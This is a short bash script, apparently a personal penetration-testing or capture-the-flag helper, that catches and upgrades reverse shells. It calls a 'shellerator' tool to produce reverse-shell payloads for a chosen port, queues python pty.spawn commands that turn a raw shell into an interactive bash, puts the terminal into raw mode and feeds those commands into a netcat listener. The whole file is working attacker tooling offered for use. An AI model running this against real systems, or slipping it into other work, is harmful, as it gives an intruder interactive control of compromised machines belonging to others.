#!/bin/bash

usage (){
    echo "$0 -p <port to listen> [-i <ip address for reverse shell> ]"
    exit 0
}

while getopts ":i:p:l:h" option
do
        case $option in
                i)
                        IP=$OPTARG
                        ;;
                p)
                        PORT=$OPTARG
                        ;;
                h)
                        usage
                        ;;
                \?)
                        echo "$OPTARG : option invalide"
                        usage
                        exit 1
                        ;;
        esac
done
if [[ -z "$PORT" ]]; then
    echo "Missing PORT"
    usage
fi

python shellerator/shellerator.py -p $PORT
#if [[ $# != 1 ]]
#    then
#    echo "Usage: $0 port"
#    exit
#fi
if [[ $? != 0 ]]
then
    exit
fi
STTY_ROWS=$(stty size | cut -d" " -f 1)
STTY_COLS=$(stty size | cut -d" " -f 2)

UPDATE_STTY="stty rows $STTY_ROWS cols $STTY_COLS"
echo "/usr/bin/env python -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" >> comm.txt
echo "/usr/bin/env python2.7 -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" > comm.txt
echo "/usr/bin/env python3 -c 'import pty; pty.spawn([\"bash\",\"-c\",\"$UPDATE_STTY  ; bash\"])'" >> comm.txt
#echo "/usr/bin/env python -c 'import pty; pty.spawn(\"/bin/bash\")'" >> comm.txt
#echo "/usr/bin/env python2.7 -c 'import pty; pty.spawn(\"/bin/bash\")'" > comm.txt
#echo "/usr/bin/env python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" >> comm.txt
#echo "/usr/bin/env perl -e 'exec \"/bin/bash\"'" > comm.txt

# echo "script -q /dev/null" > commt.txt # If no python
stty raw -echo 
cat comm.txt -| nc -lvp $PORT
reset
rm comm.txt
